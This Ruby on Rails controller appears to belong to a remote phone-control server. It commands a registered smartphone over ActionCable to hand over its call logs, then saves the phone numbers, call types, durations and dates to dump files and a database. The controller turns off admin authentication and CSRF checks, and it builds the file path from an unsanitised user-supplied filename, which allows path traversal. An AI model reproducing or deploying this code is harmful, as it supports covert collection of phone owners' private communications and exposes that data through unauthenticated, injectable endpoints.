class CallLogsController < InheritedResources::Base
  skip_before_action :authenticate_admin_user!, raise: false
  skip_before_action :verify_authenticity_token
  include CommandSender
  
  def dump_calllogs
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      currentTime = DateTime.now
      currentTimeFormat = currentTime.strftime("%Y-%m-%d_%H--%M--%S")
      fileName = params[:filename].to_s
      @fileName = fileName.empty? ? "calllogs_dump_#{currentTimeFormat}.txt" : "#{fileName}.txt"
      
      # Send command via ActionCable and wait for response
      pending_command = send_command_and_wait(@smartphone, 'get_call_logs', {}, timeout: 30.seconds)
      
      if pending_command.completed?
        raw_data = pending_command.response_data
        call_logs_data = raw_data['logs'] || raw_data['payload']&.dig('logs') || []
        
        # Save to file
        file_path = Rails.root.join('files', 'dumps', 'calllogs_dumps', @fileName)
        FileUtils.mkdir_p(File.dirname(file_path))
        formatted_content = format_call_logs(call_logs_data)
        File.write(file_path, formatted_content)
        
        # Save to database
        CallLog.create!(
          date: currentTimeFormat.gsub("_", " ").gsub("--", ":"),
          filename: @fileName,
          smartphone_id: @smartphone.id
        )
        
        # Show first 20 logs in output
        preview = call_logs_data.first(20).map { |l| "#{l['call_type']}: #{l['phone_number']} (#{l['duration']}s)" }
        commandOutput = ["Call logs dumped successfully: #{@fileName}"] + preview
      else
        error_msg = pending_command.response_data&.dig('error') || 'Unknown error'
        commandOutput = ["Operation Failed: #{error_msg}"]
      end
      
    rescue => e
      Rails.logger.error("Error dumping call logs: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    
    if want_json?
      render json: { output: commandOutput, filename: @fileName }
    else
      respond_to do |format|
        format.js {
          render "dump_calllogs", locals: { commandOutput: commandOutput, fileName: @fileName }
        }
      end
    end
  end

  private

  def want_json?
    request.format.json? || request.headers['Accept']&.include?('application/json')
  end
  
  def format_call_logs(call_logs_data)
    return "No call logs data" unless call_logs_data.is_a?(Array)
    
    call_logs_data.map do |log|
      "Number: #{log['phone_number']}\nType: #{log['call_type']}\nDuration: #{log['duration']}s\nDate: #{log['date']}\n\n"
    end.join
  end

  def call_log_params
    params.require(:call_log).permit(:date,
                                     :filename,
                                     :smartphone_id)
  end
end
